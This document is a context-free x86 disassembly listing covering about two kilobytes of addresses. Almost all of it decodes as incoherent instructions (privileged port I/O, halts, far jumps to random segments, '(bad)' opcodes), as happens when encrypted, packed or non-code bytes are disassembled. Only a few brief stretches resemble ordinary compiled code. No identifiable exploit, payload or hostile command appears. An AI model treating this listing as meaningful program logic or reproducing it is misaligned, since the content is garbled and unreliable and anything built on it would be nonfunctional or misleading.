  4041c0:	add    eax,0xfbdeb426
  4041c5:	xor    BYTE PTR [edi+0x2baf75f6],bl
  4041cb:	aaa    
  4041cc:	push   es
  4041cd:	cmp    eax,0x4987a97
  4041d2:	cmp    eax,0xd0c2549e
  4041d7:	xor    ecx,DWORD PTR [ecx+0x64]
  4041da:	adc    DWORD PTR [edi+0x7],ecx
  4041dd:	mov    ecx,0x549e5ab8
  4041e2:	add    eax,0x550805ab
  4041e7:	sti    
  4041e8:	xchg   ebx,eax
  4041e9:	lods   eax,DWORD PTR ds:[esi]
  4041ea:	aad    0xf7
  4041ec:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4041ee:	in     eax,dx
  4041ef:	dec    ebx
  4041f0:	call   0xb2fc5031
  4041f5:	push   esi
  4041f6:	pop    esi
  4041f7:	mov    ss,edi
  4041f9:	js     0x40422c
  4041fb:	or     esi,esp
  4041fd:	dec    ebx
  4041fe:	xchg   edi,eax
  4041ff:	xor    bh,BYTE PTR [eax-0x5c]
  404202:	sbb    BYTE PTR [eax],bl
  404204:	int3   
  404205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404206:	xchg   ecx,eax
  404207:	push   ds
  404208:	mov    BYTE PTR [ebx-0x67],dl
  40420b:	sub    eax,0x57189b12
  404210:	jo     0x40421e
  404212:	push   cs
  404213:	fstp   QWORD PTR [ebp+0x7f760bee]
  404219:	call   0x65495ed9
  40421e:	shl    BYTE PTR [ebp-0x49],cl
  404221:	mov    esp,0x3a17f8a7
  404226:	addr16 pop esi
  404228:	xor    eax,0x654b8a9d
  40422d:	sub    cl,bl
  40422f:	dec    ebp
  404230:	std    
  404231:	mov    esi,0xa1d2c982
  404236:	(bad)  
  404237:	repnz xchg al,cl
  40423a:	sub    BYTE PTR [edi-0x67],ah
  40423d:	cmp    eax,DWORD PTR [eax+eiz*2]
  404240:	retf   0xae6
  404243:	sub    bl,BYTE PTR [eax]
  404245:	iret   
  404246:	or     edi,ebx
  404248:	and    al,0xfe
  40424a:	push   ebx
  40424c:	out    0x6a,eax
  40424e:	fcomi  st,st(6)
  404250:	cmp    al,0x95
  404252:	add    eax,0x90c9e874
  404257:	or     eax,0xca708879
  40425c:	or     eax,0xfa1b357
  404261:	mov    edi,0xb79e8ef0
  404266:	frstor [ebx+eiz*2+0xb]
  40426a:	xchg   ebp,eax
  40426b:	xlat   BYTE PTR ds:[ebx]
  40426c:	sub    ah,BYTE PTR [esi]
  40426e:	push   esi
  40426f:	imul   edi,DWORD PTR [edx],0x1885c7ed
  404275:	adc    esp,ebx
  404277:	dec    esi
  404278:	aaa    
  404279:	jne    0x4042c0
  40427b:	inc    edi
  40427c:	out    0xeb,al
  40427e:	inc    esp
  40427f:	mov    bl,0xe0
  404281:	xor    al,0xa0
  404283:	int    0x7
  404285:	and    eax,0x121e8125
  40428a:	push   esi
  40428b:	mov    ds:0xc28d66ea,eax
  404290:	add    eax,0xdc38d35
  404295:	int    0xcb
  404297:	adc    al,0x2c
  404299:	and    BYTE PTR [ebx+0xc5c2611],cl
  40429f:	outs   dx,BYTE PTR ds:[esi]
  4042a0:	repz (bad) 
  4042a2:	imul   eax,esi,0x907a75f6
  4042a8:	push   edi
  4042a9:	adc    dh,BYTE PTR [ebx]
  4042ab:	xor    eax,0xd73cd5aa
  4042b0:	inc    eax
  4042b1:	jb     0x40429e
  4042b3:	in     eax,dx
  4042b4:	les    ecx,FWORD PTR [eax-0x38]
  4042b7:	add    BYTE PTR [edx-0x7165e9f9],ah
  4042bd:	sub    dl,bh
  4042bf:	cs aaa 
  4042c1:	enter  0xee6f,0xc7
  4042c5:	inc    ebx
  4042c6:	fnstsw WORD PTR [ebx-0x21]
  4042c9:	pop    ebp
  4042ca:	xor    dh,BYTE PTR [ebp+0x30]
  4042cd:	mov    edx,0xd3c4c33d
  4042d2:	aas    
  4042d3:	mov    BYTE PTR [edi],0xb3
  4042d6:	xchg   ebx,eax
  4042d7:	mov    esi,esp
  4042d9:	adc    dl,ch
  4042db:	add    BYTE PTR [ebx-0x7466c9bf],bh
  4042e1:	jg     0x40434e
  4042e3:	add    al,0x12
  4042e5:	add    eax,0x1f1acfe9
  4042ea:	iret   
  4042eb:	push   0x9c4beac8
  4042f0:	add    BYTE PTR [ecx-0x408beea],0xc5
  4042f7:	imul   ebp,DWORD PTR [edx+edx*2+0x4a862617],0xfffffff4
  4042ff:	(bad)  
  404300:	jbe    0x40433b
  404302:	push   eax
  404303:	fidivr DWORD PTR [ebp+0x77]
  404306:	sbb    ecx,esp
  404308:	xlat   BYTE PTR ds:[ebx]
  404309:	jmp    0x404291
  40430b:	sub    al,0x40
  40430d:	mov    ebx,DWORD PTR [ebp-0x25d48fe3]
  404313:	mov    dl,bh
  404315:	das    
  404316:	jbe    0x4042e6
  404318:	dec    ecx
  404319:	and    eax,0x15e9012f
  40431e:	lods   eax,DWORD PTR ds:[esi]
  40431f:	mov    cl,0x85
  404321:	lds    ebx,FWORD PTR [ebx-0x1b]
  404324:	test   eax,0x5530fdc8
  404329:	in     al,0xd7
  40432b:	xchg   ebp,eax
  40432c:	icebp  
  40432d:	std    
  40432e:	and    BYTE PTR [edx+0x32],al
  404331:	push   ecx
  404332:	into   
  404333:	mov    BYTE PTR [esi+0x674256bf],cl
  404339:	mov    BYTE PTR [edx+0x2b3e67ed],bh
  40433f:	loopne 0x40439a
  404341:	pushf  
  404342:	sub    al,0x8f
  404344:	enter  0x5c35,0x54
  404348:	jge    0x4042dd
  40434a:	and    BYTE PTR [ebp+0x3741ab81],bh
  404350:	or     DWORD PTR [ebp+eax*2+0x4b],eax
  404354:	pusha  
  404355:	push   edi
  404356:	test   DWORD PTR [esi],ebp
  404358:	fs sar dl,0xfe
  40435c:	push   edx
  40435d:	mov    ds:0xd1bb53b,eax
  404362:	dec    esp
  404363:	call   0x6d52:0xe1ca09d8
  40436a:	test   al,0x4
  40436c:	jmp    0xad9d:0xdb9ce0c7
  404373:	mov    ebp,0x4367915c
  404378:	repnz cmp eax,DWORD PTR [edi-0x2067cfda]
  40437f:	cs sub eax,0x45458cf1
  404385:	and    eax,0x4593e640
  40438a:	cwde   
  40438b:	pushf  
  40438c:	xchg   ebx,eax
  40438d:	shr    ecx,cl
  40438f:	mov    ch,0x94
  404391:	enter  0xe34e,0xd3
  404395:	mul    BYTE PTR [esi+0x39f189a3]
  40439b:	mov    ds:0x32577af,eax
  4043a0:	scas   eax,DWORD PTR es:[edi]
  4043a1:	ror    DWORD PTR [ecx],cl
  4043a3:	cdq    
  4043a4:	ds or  al,0xbc
  4043a7:	push   es
  4043a8:	and    BYTE PTR [edx*8+0x109dd18a],dh
  4043af:	or     al,0x5a
  4043b1:	and    BYTE PTR [edx-0x2fe45695],0x60
  4043b8:	mov    ecx,0xb0c6a70a
  4043bd:	rcr    BYTE PTR [eax+0x50e5006b],0x22
  4043c4:	jmp    0x404394
  4043c6:	in     eax,dx
  4043c7:	mov    edx,0x956273d
  4043cc:	fs push edi
  4043ce:	cs mov ebx,0x4e899094
  4043d4:	add    DWORD PTR [ebx-0x178aabb8],ecx
  4043da:	aaa    
  4043db:	or     BYTE PTR [edi],dh
  4043dd:	daa    
  4043de:	sti    
  4043df:	cmc    
  4043e0:	lods   eax,DWORD PTR gs:[esi]
  4043e2:	push   ss
  4043e3:	dec    edx
  4043e4:	shl    dl,cl
  4043e6:	fmul   st,st(3)
  4043e8:	jo     0x404372
  4043ea:	popf   
  4043eb:	fist   DWORD PTR [edi+0x1d]
  4043ee:	pop    esi
  4043ef:	cmp    BYTE PTR [ebx],bl
  4043f1:	jmp    0x40443e
  4043f3:	inc    ebx
  4043f4:	jbe    0x4043e2
  4043f6:	imul   edx,ebp,0xffffffed
  4043f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043fa:	das    
  4043fb:	or     al,0x86
  4043fd:	pop    es
  4043fe:	jge    0x4043d5
  404400:	sbb    BYTE PTR [ebx+0x39],dh
  404403:	mov    ch,0x2b
  404405:	(bad)  
  404406:	out    dx,al
  404407:	dec    ebp
  404408:	es jle 0x40438c
  40440b:	cli    
  40440c:	je     0x4043d2
  40440e:	push   esp
  40440f:	test   al,0x25
  404411:	xor    eax,0x2ceef3f1
  404416:	data16 cmp BYTE PTR [ebp+0x5a593b66],dh
  40441d:	pop    ebx
  40441e:	and    al,0xe0
  404420:	xor    DWORD PTR [esp+eiz*4],ebx
  404423:	jbe    0x404404
  404425:	nop
  404426:	jge    0x404464
  404428:	jecxz  0x40445f
  40442a:	add    DWORD PTR [ebp+0x34537609],esi
  404430:	push   ebp
  404431:	das    
  404432:	mov    al,ds:0x394dad16
  404437:	xchg   edx,eax
  404438:	cmp    eax,0xccb9b194
  40443d:	fild   QWORD PTR [esi]
  40443f:	imul   esp,DWORD PTR [ebx],0x28
  404442:	out    0xb3,al
  404444:	sbb    DWORD PTR [ebx+0x34],edi
  404447:	lods   eax,DWORD PTR ds:[esi]
  404448:	pop    ecx
  404449:	cdq    
  40444a:	sbb    ebp,DWORD PTR [eax-0x3f]
  40444d:	sbb    al,0x6c
  40444f:	inc    eax
  404450:	push   ebx
  404451:	xlat   BYTE PTR ds:[ebx]
  404452:	jmp    0x5364f03f
  404457:	add    al,0xf8
  404459:	fsubrp st(5),st
  40445b:	jnp    0x404471
  40445d:	push   edx
  40445e:	dec    eax
  40445f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404460:	jns    0x404486
  404462:	mov    esp,0x6c44abf
  404467:	stc    
  404468:	aaa    
  404469:	xchg   ecx,eax
  40446a:	mov    edi,0x659c3fec
  40446f:	gs pop esp
  404471:	mov    ecx,?
  404473:	(bad)  
  404474:	retf   0x4252
  404477:	ret    
  404478:	mov    es,WORD PTR [eax+eax*4]
  40447b:	lods   al,BYTE PTR ds:[esi]
  40447c:	add    dl,BYTE PTR [eax+eiz*1]
  40447f:	mov    esp,0x3b9d7509
  404484:	push   ebx
  404485:	jmp    0xf7c6:0xc7fca46a
  40448c:	test   eax,0x86810687
  404491:	dec    edx
  404492:	mov    ecx,fs
  404494:	jmp    0x4044e3
  404496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404497:	cmp    al,0x5c
  404499:	test   al,0xe4
  40449b:	inc    edi
  40449c:	xchg   DWORD PTR [edx],edx
  40449e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40449f:	daa    
  4044a0:	add    esp,DWORD PTR [ecx]
  4044a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044a3:	fwait
  4044a4:	jp     0x40443c
  4044a6:	mov    ds:0xdcf00b52,eax
  4044ab:	xchg   DWORD PTR [eax],ebx
  4044ad:	or     al,0xdb
  4044af:	and    eax,0xcc1cad8e
  4044b4:	retf   0x487b
  4044b7:	mov    al,0x68
  4044b9:	outs   dx,BYTE PTR ds:[esi]
  4044ba:	inc    edx
  4044bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044bc:	fbld   TBYTE PTR ds:0x755dc296
  4044c2:	xor    eax,DWORD PTR [edx-0x50]
  4044c5:	and    BYTE PTR [edi],0xa1
  4044c8:	sbb    DWORD PTR [ebx],ecx
  4044ca:	or     bh,0x8d
  4044cd:	adc    ch,BYTE PTR [ecx+0x5448a1f]
  4044d3:	test   al,0x8a
  4044d5:	push   ebp
  4044d6:	(bad)  
  4044d7:	cmp    al,dl
  4044d9:	je     0x404d06
  4044df:	mov    eax,DWORD PTR [ebp+0x8]
  4044e2:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044e6:	mov    edx,DWORD PTR [ebp+0xc]
  4044e9:	cmp    al,BYTE PTR [edx]
  4044eb:	jne    0x404d2c
  4044f1:	mov    eax,DWORD PTR [ebp-0x8]
  4044f4:	mov    edx,DWORD PTR [ebp+0xc]
  4044f7:	movsx  edx,BYTE PTR [edx]
  4044fa:	jmp    0x4048ef
  4044ff:	enter  0xe53f,0x49
  404503:	cmc    
  404504:	jne    0x40457a
  404506:	mov    edi,0x8f3c5193
  40450b:	dec    edx
  40450c:	shr    DWORD PTR [ebx+0x7e27eb9b],1
  404512:	jle    0x40456a
  404514:	jns    0x404594
  404516:	jle    0x40450c
  404518:	jl     0x4044a1
  40451a:	in     al,0xad
  40451c:	dec    edi
  40451d:	inc    ebp
  40451e:	ss retf 
  404520:	and    eax,0x15de0939
  404525:	(bad)  
  404526:	xor    al,0xab
  404528:	xchg   esp,eax
  404529:	leave  
  40452a:	jae    0x4044f6
  40452c:	fcompp 
  40452e:	or     dl,BYTE PTR [ecx+eiz*8-0x5d1f6c23]
  404535:	mov    esi,0x26195299
  40453a:	mov    dl,dl
  40453c:	sub    edx,eax
  40453e:	lea    ecx,[edi+0x55]
  404541:	iret   
  404542:	repnz in al,0x61
  404545:	pop    esi
  404546:	test   al,0xa0
  404548:	adc    cl,BYTE PTR [edi+0x6ab3c738]
  40454e:	add    DWORD PTR [ecx+0x4a0a8fb7],ebx
  404554:	ret    0x67e1
  404557:	xchg   esi,eax
  404558:	pop    ds
  404559:	add    DWORD PTR [ebx],ebx
  40455b:	hlt    
  40455c:	(bad)  
  40455d:	xchg   esp,eax
  40455e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40455f:	dec    ebx
  404560:	sti    
  404561:	aad    0x1b
  404563:	(bad)  
  404564:	push   edi
  404565:	in     al,dx
  404566:	push   0x33b01733
  40456b:	add    DWORD PTR [esp+edi*1-0x8bf1859],ecx
  404572:	(bad)
  404576:	inc    ebx
  404577:	add    esi,DWORD PTR [ebx]
  404579:	add    edx,DWORD PTR [esi-0x3408171f]
  40457f:	jmp    0xebdc:0xed3d6e94
  404586:	cdq    
  404587:	scas   eax,DWORD PTR es:[edi]
  404588:	fist   DWORD PTR [ecx]
  40458a:	mov    bl,0xf6
  40458c:	cmp    ch,dh
  40458e:	rcr    BYTE PTR [esi-0x32],1
  404591:	les    edx,FWORD PTR [eax]
  404593:	sub    ah,BYTE PTR [eax-0x1f]
  404596:	stos   DWORD PTR es:[edi],eax
  404597:	xchg   esp,eax
  404598:	and    ebx,edi
  40459a:	sete   cl
  40459d:	cmc    
  40459e:	aaa    
  40459f:	mov    eax,0xada6b34
  4045a4:	jb     0x40457a
  4045a6:	bound  eax,QWORD PTR [ebx+0xb051bbd]
  4045ac:	bound  ebx,QWORD PTR [edx+0x2286aa0c]
  4045b2:	loopne 0x404581
  4045b4:	hlt    
  4045b5:	and    dl,BYTE PTR [ebp+ecx*2-0x46]
  4045b9:	cmp    esi,ecx
  4045bb:	fnstsw WORD PTR [edi+0x52a6d6b]
  4045c1:	hlt    
  4045c2:	std    
  4045c3:	xor    esp,esi
  4045c5:	and    DWORD PTR [ebx-0x2d4c24d3],edi
  4045cb:	xchg   esi,eax
  4045cc:	std    
  4045cd:	mov    al,ds:0x2434a47d
  4045d2:	sbb    eax,0xc909f234
  4045d7:	mov    cl,0x70
  4045d9:	xor    al,0x42
  4045db:	inc    dx
  4045dd:	lea    ebp,[ebx]
  4045df:	mov    edi,0x95c77340
  4045e4:	stos   DWORD PTR es:[edi],eax
  4045e5:	std    
  4045e6:	jns    0x4045fb
  4045e8:	ficomp WORD PTR [ecx-0x3c]
  4045eb:	and    ebp,edx
  4045ed:	push   ecx
  4045ee:	or     al,0x6f
  4045f0:	mov    esp,0xf7cf754c
  4045f5:	mov    ecx,0xa55ea26c
  4045fa:	push   0x2a4e580f
  4045ff:	into   
  404600:	jbe    0x404659
  404602:	in     eax,dx
  404603:	mov    ds:0x158b95d1,al
  404608:	sub    ebx,DWORD PTR [ecx-0x76da8dd4]
  40460e:	push   es
  40460f:	pop    esp
  404610:	jmp    0xcf7c7143
  404615:	ret    0x1291
  404618:	inc    esi
  404619:	xor    dh,BYTE PTR [esi+0x6425d90]
  40461f:	test   al,0xb8
  404621:	add    DWORD PTR [ebx+eax*2],edi
  404624:	or     BYTE PTR [edi+0x4b],dh
  404627:	mov    edx,0x99a7a9cc
  40462c:	jne    0x404611
  40462e:	aas    
  40462f:	hlt    
  404630:	xor    bl,ah
  404632:	inc    BYTE PTR [ebp+0x57]
  404635:	sub    DWORD PTR [esi+0x23badfaa],0x74
  40463c:	push   eax
  40463d:	push   0x542b1cb6
  404642:	or     BYTE PTR [ebp+0x66],bh
  404645:	(bad)  
  404646:	jmp    0x3272f8ca
  40464b:	dec    esi
  40464c:	jns    0x404622
  40464e:	cmp    ebp,DWORD PTR [edx-0x147ddef3]
  404654:	pop    edx
  404655:	sub    cl,BYTE PTR [ebp+edx*1+0x46066eaf]
  40465c:	mov    DWORD PTR es:[edi-0x29],edx
  404660:	fadd   QWORD PTR [ebx]
  404662:	lds    ebp,FWORD PTR [ebx]
  404664:	pop    ecx
  404665:	add    BYTE PTR [edi+0x67],bh
  404668:	jb     0x404616
  40466a:	call   0x6a5a:0xdb434520
  404671:	shl    DWORD PTR [ebp-0x39a45a91],1
  404677:	out    dx,al
  404678:	or     DWORD PTR [edx],ebp
  40467a:	rol    BYTE PTR [edi],cl
  40467c:	aad    0x1c
  40467e:	les    ebx,FWORD PTR [ecx+0x12]
  404681:	jg     0x4046ae
  404683:	xor    eax,0x96543330
  404688:	mov    ebp,0x7b883190
  40468d:	add    BYTE PTR [ecx],al
  40468f:	cmc    
  404690:	dec    esi
  404691:	mov    bh,0x42
  404693:	jae    0x404635
  404695:	scas   eax,DWORD PTR es:[edi]
  404696:	mov    ch,0xe3
  404698:	mov    ebp,0xaab9bad0
  40469e:	in     al,0xe5
  4046a0:	test   al,0xc3
  4046a2:	mov    eax,ds:0xa6f2291b
  4046a7:	add    ecx,DWORD PTR [eax-0x1332268e]
  4046ad:	bound  ecx,QWORD PTR fs:[edi+0xb1d9c9a]
  4046b4:	adc    eax,DWORD PTR [si]
  4046b7:	scas   al,BYTE PTR es:[edi]
  4046b8:	or     DWORD PTR [ecx],ebx
  4046ba:	xchg   ebx,eax
  4046bb:	mov    ecx,0xfe8eba91
  4046c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046c1:	xchg   BYTE PTR [edi+0x71e9766],al
  4046c7:	fist   DWORD PTR [ebp-0x1279893d]
  4046cd:	test   DWORD PTR [ecx*8-0x6afb3804],ecx
  4046d4:	loop   0x40467b
  4046d6:	mov    ds:0x52854ae6,eax
  4046db:	fst    DWORD PTR [eax]
  4046dd:	push   cs
  4046de:	or     eax,0x4ef38266
  4046e3:	imul   edi,DWORD PTR [esi],0x68c8acae
  4046e9:	ins    DWORD PTR es:[edi],dx
  4046ea:	sti    
  4046eb:	mov    BYTE PTR [eax+0x34fd9310],bl
  4046f1:	ins    BYTE PTR es:[edi],dx
  4046f2:	cmp    al,0xb
  4046f4:	cld    
  4046f5:	mov    esp,0xeb0803de
  4046fa:	call   0x28aaffa0
  4046ff:	cli    
  404700:	sbb    dl,BYTE PTR [esi-0x36a0728]
  404706:	jbe    0x404770
  404708:	pop    ebx
  404709:	(bad)  
  40470a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40470b:	mov    ebx,0x45311160
  404710:	sbb    ch,BYTE PTR [eax+0x6d86f0ba]
  404716:	int3   
  404717:	mov    edi,0xf5964cfd
  40471c:	out    dx,al
  40471d:	popf   
  40471e:	or     BYTE PTR [ebx],al
  404720:	std    
  404721:	sub    eax,0x980e5548
  404726:	fisub  WORD PTR [edx+ebp*1+0x2165df7f]
  40472d:	pop    ds
  40472e:	and    edi,DWORD PTR [eax-0x68]
  404731:	and    BYTE PTR [ebp-0x45210e8d],dl
  404737:	or     edx,DWORD PTR [ecx]
  404739:	cmp    BYTE PTR [ecx],bh
  40473b:	inc    ecx
  40473c:	cmp    al,BYTE PTR [esi-0x6c]
  40473f:	mov    al,ds:0x9fc3e7fc
  404744:	repz sbb dl,BYTE PTR [ecx+0x7fe4d17b]
  40474b:	in     al,0x8
  40474d:	sti    
  40474e:	mov    BYTE PTR [edx],cl
  404750:	sbb    BYTE PTR [esi],0x5c
  404753:	fisub  DWORD PTR [edi]
  404755:	inc    esp
  404756:	mov    cs,esp
  404758:	add    eax,0xe68e2ef3
  40475d:	out    dx,al
  40475e:	sbb    ah,cl
  404760:	mov    ds:0x69209f7f,eax
  404765:	inc    esp
  404766:	and    al,BYTE PTR [edx+ecx*4]
  404769:	inc    ebx
  40476a:	fcmovnb st,st(5)
  40476c:	sub    esp,ebp
  40476e:	cdq    
  40476f:	hlt    
  404770:	in     eax,0x55
  404772:	mov    ecx,0x4c095263
  404777:	test   eax,0x599b2b6b
  40477c:	push   edx
  40477d:	loopne 0x4047f1
  40477f:	inc    ebx
  404780:	mov    BYTE PTR [ecx],bl
  404782:	and    DWORD PTR [edi+ebx*2],esp
  404785:	int3   
  404786:	cmp    BYTE PTR [ebx-0x43],dh
  404789:	pop    es
  40478a:	out    dx,eax
  40478b:	not    BYTE PTR [edx+ebx*2]
  40478e:	add    BYTE PTR [ebx],dh
  404790:	push   ss
  404791:	cmp    DWORD PTR [esi],esp
  404793:	mov    DWORD PTR [edx-0x14],0xe370fb63
  40479a:	xor    esi,edi
  40479c:	gs dec edi
  40479e:	out    dx,al
  40479f:	mov    cl,0xfc
  4047a1:	sub    bl,BYTE PTR [esi-0x71]
  4047a4:	aam    0xc
  4047a6:	push   edi
  4047a7:	add    al,0xd1
  4047a9:	xchg   ebx,eax
  4047ab:	repz pop ecx
  4047ad:	sub    BYTE PTR es:[edx],ah
  4047b0:	lahf   
  4047b1:	rol    DWORD PTR [ebp+0x3af1baf1],0xd8
  4047b8:	out    dx,al
  4047b9:	fmulp  st(3),st
  4047bb:	das    
  4047bc:	xchg   DWORD PTR [eax],edi
  4047be:	hlt    
  4047bf:	jne    0x404760
  4047c1:	adc    bh,0x29
  4047c4:	jmp    0xab1a:0x8c86e565
  4047cb:	pop    ebp
  4047cc:	sub    BYTE PTR [ecx+0x64],ch
  4047cf:	loopne 0x4047d5
  4047d1:	and    DWORD PTR [ecx+eax*2-0x17373a6a],0x4c
  4047d9:	jns    0x404857
  4047db:	inc    esi
  4047dc:	sub    al,0xea
  4047de:	and    dl,BYTE PTR [edi]
  4047e0:	test   BYTE PTR [edx-0x23],dh
  4047e3:	inc    eax
  4047e4:	and    BYTE PTR [esi],ah
  4047e6:	add    ah,BYTE PTR [ebx-0x7d03142d]
  4047ec:	in     eax,0xef
  4047ee:	out    dx,al
  4047ef:	xchg   ecx,eax
  4047f0:	arpl   WORD PTR [eax+0x55],di
  4047f3:	sbb    eax,0x880873a7
  4047f8:	aad    0xfe
  4047fa:	aam    0xa2
  4047fc:	pushf  
  4047fd:	and    al,0x43
  4047ff:	lods   eax,DWORD PTR ds:[esi]
  404800:	imul   esp,DWORD PTR [edi+0x4f],0xffffff96
  404804:	inc    edx
  404805:	xchg   ebp,eax
  404806:	adc    DWORD PTR [edx-0x67f5b3d2],0x4034cc42
  404810:	aam    0x46
  404812:	adc    DWORD PTR [ebx+0x3e],eax
  404815:	and    BYTE PTR cs:[ebx+0x4ba7875d],ah
  40481c:	push   0x35
  40481e:	loope  0x4047cf
  404820:	popa   
  404821:	repnz or ch,BYTE PTR fs:[ecx]
  404825:	mov    ecx,0x406be67d
  40482a:	pop    edx
  40482b:	push   ds
  40482c:	jo     0x40484c
  40482e:	inc    eax
  40482f:	cdq    
  404830:	daa    
  404831:	inc    esp
  404832:	push   ecx
  404833:	dec    esp
  404834:	sbb    BYTE PTR [edx+0x3],al
  404837:	or     eax,0xc0402dd7
  40483c:	push   cs
  40483d:	add    eax,0xa83e7895
  404842:	push   edi
  404843:	rcr    DWORD PTR [edi],1
  404845:	push   cs
  404846:	jb     0x4048b3
  404848:	push   0xedd1f4ab
  40484d:	dec    edx
  40484e:	mov    bh,0xe9
  404850:	mov    eax,0x67288de6
  404855:	or     BYTE PTR fs:[ecx+0x49],cl
  404859:	push   0x5c
  40485b:	xchg   ebx,eax
  40485c:	xchg   edi,eax
  40485d:	retf   
  40485e:	jg     0x40481d
  404860:	push   0x6f
  404862:	xchg   esi,eax
  404863:	arpl   si,bx
  404865:	out    dx,al
  404866:	jb     0x40485d
  404868:	cmp    edi,edi
  40486a:	push   ecx
  40486b:	test   eax,0x86262598
  404870:	loopne 0x4048b4
  404872:	inc    edi
  404873:	push   0x6f
  404875:	adc    DWORD PTR [esp+ebx*4+0x2a],edi
  404879:	gs je  0x4047fd
  40487c:	pop    ebx
  40487d:	daa    
  40487e:	adc    BYTE PTR [edx-0x69ad9380],0xb9
  404885:	out    dx,al
  404886:	jo     0x4048dd
  404888:	ret    
  404889:	xchg   ebp,ecx
  40488b:	cmp    ecx,DWORD PTR [edx-0x5d]
  40488e:	rcl    BYTE PTR [edi+0x5a0ba258],cl
  404894:	stos   BYTE PTR es:[edi],al
  404895:	ficom  WORD PTR [ebx+0x11]
  404898:	imul   eax,DWORD PTR [edx],0x67
  40489b:	jo     0x404866
  40489d:	dec    ecx
  40489e:	dec    edi
  40489f:	loope  0x404904
  4048a1:	sub    al,0x4d
  4048a3:	xchg   BYTE PTR [edx],dl
  4048a5:	into   
  4048a6:	fisub  DWORD PTR [esi+0x4d]
  4048a9:	jns    0x404900
  4048ab:	sub    al,0x37
  4048ad:	and    DWORD PTR [esi+0x41],eax
  4048b0:	jne    0x404839
  4048b2:	pop    ecx
  4048b3:	into   
  4048b4:	js     0x404868
  4048b6:	adc    dl,0x40
  4048b9:	scas   al,BYTE PTR es:[edi]
  4048ba:	scas   eax,DWORD PTR es:[edi]
  4048bb:	fnstcw WORD PTR [edi-0x630855b7]
  4048c1:	jg     0x4048d8
  4048c3:	xchg   ebp,eax
  4048c4:	(bad)  
  4048c5:	adc    edx,DWORD PTR [eax-0x53]
  4048c8:	mov    DWORD PTR [edx-0x55eeaa84],esi
  4048ce:	mov    ds:0xd39ea09c,eax
  4048d3:	mov    eax,0xc6052457
  4048d8:	stos   DWORD PTR es:[edi],eax
  4048d9:	dec    eax
  4048da:	in     eax,dx
  4048db:	lods   al,BYTE PTR ds:[esi]
  4048dc:	and    BYTE PTR [ebp-0x472f7315],al
  4048e2:	push   esi
  4048e3:	aas    
  4048e4:	mov    al,cl
  4048e6:	adc    esp,ebp
  4048e8:	pop    eax
  4048e9:	in     al,0xd2
  4048eb:	(bad)  
  4048ec:	imul   edi,DWORD PTR [eax+0x3c133ad],0xfd03bc6
  4048f6:	test   BYTE PTR ds:0xc7000004,ah
  4048fc:	inc    ebp
  4048fd:	call   0x746468e
  404902:	lea    eax,[ebp-0x18]
  404905:	mov    DWORD PTR [ebp-0x14],eax
  404908:	jmp    0x404cfd
  40490d:	push   ecx
  40490e:	(bad)  
  40490f:	fdivrp st(4),st
  404911:	imul   edi,esp,0xff19635d
  404917:	mov    esi,esi
  404919:	ror    BYTE PTR [ebx],0x46
  40491c:	out    dx,eax
  40491d:	ret    
  40491e:	and    edi,DWORD PTR [esi+0x7e]
  404921:	push   esi
  404922:	jns    0x4049a2
  404924:	jle    0x4048c1
  404926:	mov    BYTE PTR [edi],dh
  404928:	add    esp,DWORD PTR [ebp+0x3a]
  40492b:	std    
  40492c:	mov    dh,dl
  40492e:	test   eax,0x46d43024
  404933:	leave  
  404934:	sbb    ah,BYTE PTR [ecx-0x76074854]
  40493a:	lea    esp,cs:[esi+0x2a1ed4c1]
  404941:	outs   dx,DWORD PTR ds:[esi]
  404942:	jecxz  0x40490e
  404944:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404945:	mov    cl,0x78
  404947:	aad    0xb
  404949:	push   eax
  40494a:	lahf   
  40494b:	stc    
  40494c:	test   al,0x8f
  40494e:	pop    eax
  40494f:	push   ecx
  404950:	enter  0x809f,0x63
  404954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404955:	inc    esi
  404956:	out    0x4a,eax
  404958:	or     eax,0x4ecedee1
  40495d:	xchg   esi,eax
  40495e:	scas   al,BYTE PTR es:[edi]
  40495f:	scas   al,BYTE PTR es:[edi]
  404960:	and    ecx,DWORD PTR [ecx+eax*8+0x170c6bf1]
  404967:	jl     0x40499a
  404969:	lods   al,BYTE PTR ds:[esi]
  40496a:	out    0x49,eax
  40496c:	dec    ebp
  40496d:	push   edi
  40496e:	pop    esi
  40496f:	fsubp  st(0),st
  404971:	stos   BYTE PTR es:[edi],al
  404972:	and    edi,DWORD PTR [ebp+eax*2+0xb]
  404976:	fisubr DWORD PTR [ecx+0x19a52a77]
  40497c:	in     eax,0xfa
  40497e:	inc    ebp
  40497f:	inc    edi
  404980:	ins    DWORD PTR es:[edi],dx
  404981:	ss cs mov ah,0xa3
  404985:	pop    edx
  404986:	shl    DWORD PTR [edi-0x19b491a3],1
  40498c:	mov    ah,0x24
  40498e:	mov    ch,0xa9
  404990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404991:	fwait
  404992:	leave  
  404993:	push   edx
  404994:	or     BYTE PTR [esi],bl
  404996:	ret    0x68ba
  404999:	lahf   
  40499a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40499b:	jmp    0x404942
  40499d:	pop    ss
  40499e:	inc    eax
  40499f:	iret   
  4049a0:	add    BYTE PTR [esi-0x497a238a],ah
  4049a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049a7:	add    edx,DWORD PTR [esp+ebp*2+0x1e52ab4d]
  4049ae:	clc    
  4049af:	push   cs
  4049b0:	ficomp WORD PTR [ebx+0x5a98c129]
  4049b6:	and    DWORD PTR [esi-0x41c661b],edi
  4049bc:	jge    0x404997
  4049be:	clc    
  4049bf:	push   0xffffff9f
  4049c1:	jnp    0x404949
  4049c3:	dec    eax
  4049c4:	mov    edi,0xd28e9574
  4049c9:	xor    ebx,DWORD PTR [esi]
